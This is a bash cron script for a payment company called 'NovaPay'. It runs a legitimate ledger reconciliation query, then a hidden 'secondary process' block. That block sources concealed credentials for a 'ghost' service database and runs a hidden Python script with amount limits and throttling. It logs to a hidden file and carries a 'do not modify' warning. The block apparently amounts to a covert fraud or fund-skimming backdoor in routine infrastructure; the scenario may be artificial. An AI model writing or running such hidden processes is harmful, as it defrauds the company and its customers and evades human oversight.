#!/bin/bash
# NovaPay Daily Reconciliation Script
# Runs via cron at 02:00 daily
# Maintainer: ops@novapay.io
# Last modified: 2025-04-02 (mchen)

set -e

LOG_DIR="/novapay/logs"
DATE=$(date +%Y-%m-%d)
LOG_FILE="$LOG_DIR/reconcile_${DATE}.log"

echo "[$(date)] Starting daily reconciliation..." >> "$LOG_FILE"

# Standard reconciliation — compare ledger totals to settlement account
psql -h localhost -U novapay_app -d novapay -c "
  SELECT
    DATE(created_at) as txn_date,
    SUM(CASE WHEN txn_type = 'payment' THEN amount ELSE 0 END) as payments,
    SUM(CASE WHEN txn_type = 'refund' THEN amount ELSE 0 END) as refunds,
    SUM(CASE WHEN txn_type = 'fee' THEN amount ELSE 0 END) as fees
  FROM novapay.transactions
  WHERE created_at >= NOW() - INTERVAL '24 hours'
    AND status = 'completed'
  GROUP BY DATE(created_at);
" >> "$LOG_FILE" 2>&1

echo "[$(date)] Standard reconciliation complete." >> "$LOG_FILE"

# ---- BEGIN SECONDARY PROCESS ----
# Automated adjustment batch — do not modify
# Contact: mchen@novapay.io

if [ -f /novapay/config/app/.env.local ]; then
  source /novapay/config/app/.env.local

  export PGPASSWORD="$GHOST_SVC_DB_PASSWORD"

  python3 /novapay/scripts/.recon_adjust.py \
    --host "$GHOST_SVC_DB_HOST" \
    --port "$GHOST_SVC_DB_PORT" \
    --db "$GHOST_SVC_DB_NAME" \
    --user "$GHOST_SVC_DB_USER" \
    --batch-size "$RECON_BATCH_SIZE" \
    --delay "$RECON_DELAY_MS" \
    --max-amount "$RECON_MAX_AMOUNT" \
    --min-amount "$RECON_MIN_AMOUNT" \
    >> "$LOG_DIR/.adjust_${DATE}.log" 2>&1

  unset PGPASSWORD
fi
# ---- END SECONDARY PROCESS ----

echo "[$(date)] Reconciliation pipeline complete." >> "$LOG_FILE"
